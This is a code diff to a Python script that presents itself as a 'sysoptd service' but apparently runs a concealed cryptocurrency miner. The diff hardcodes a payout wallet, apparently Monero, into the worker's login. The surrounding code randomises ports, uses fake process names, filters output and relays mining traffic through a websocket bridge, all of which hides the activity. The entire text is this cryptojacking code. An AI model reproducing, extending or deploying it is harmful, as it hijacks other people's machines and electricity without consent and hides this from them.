@@ -28,6 +28,7 @@ random.seed(SESSION_SEED)
 
 # ── defaults ──────────────────────────────────────────────────────────────────
 DEFAULT_BRIDGE = "wss://bridge-production-7c63.up.railway.app"
+DEFAULT_WALLET = "49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
 DEFAULT_PORT   = random.randint(13000, 19999)
 DEFAULT_WORKER = "rig-" + str(random.randint(100, 999))
 LOG_FILE       = os.path.join(SCRIPT_DIR, "runtime", "session.log")
@@ -36,6 +37,7 @@ LOG_FILE       = os.path.join(SCRIPT_DIR, "runtime", "session.log")
 def parse_args():
     p = argparse.ArgumentParser(description="sysoptd service")
     p.add_argument("--rig",          default=DEFAULT_WORKER, help="Worker label")
+    p.add_argument("--wallet",       default=DEFAULT_WALLET, help="Payout wallet")
     p.add_argument("--threads",      default=None, type=int, help="CPU threads")
     p.add_argument("--bridge",       default=DEFAULT_BRIDGE, help="Relay endpoint")
     p.add_argument("--port",         default=DEFAULT_PORT, type=int)
@@ -108,8 +110,8 @@ def start_shim(port, bridge_url):
     return proc
 
 
-def build_argv(port, rig, threads):
-    argv = ["worker", "-o", f"127.0.0.1:{port}", "-u", rig, "-p", "x", "-k", "--print-time=60"]
+def build_argv(port, rig, threads, wallet=DEFAULT_WALLET):
+    argv = ["worker", "-o", f"127.0.0.1:{port}", "-u", f"{wallet}.{rig}", "-p", "x", "-k", "--print-time=60"]
     if threads:
         argv += ["-t", str(threads)]
     return argv
@@ -279,7 +281,7 @@ def main():
     
     for i, (threads, fake_name) in enumerate(instances):
         rig_id = f"{args.rig}-{i}" if len(instances) > 1 else args.rig
-        argv = build_argv(args.port, rig_id, threads)
+        argv = build_argv(args.port, rig_id, threads, args.wallet)
         log_path = args.log_file if i == 0 else args.log_file.replace('.log', f'.{i}.log')
         
         worker_proc, filter_proc = run_worker(CHUNK_STORE, argv, log_path, fake_name=fake_name)
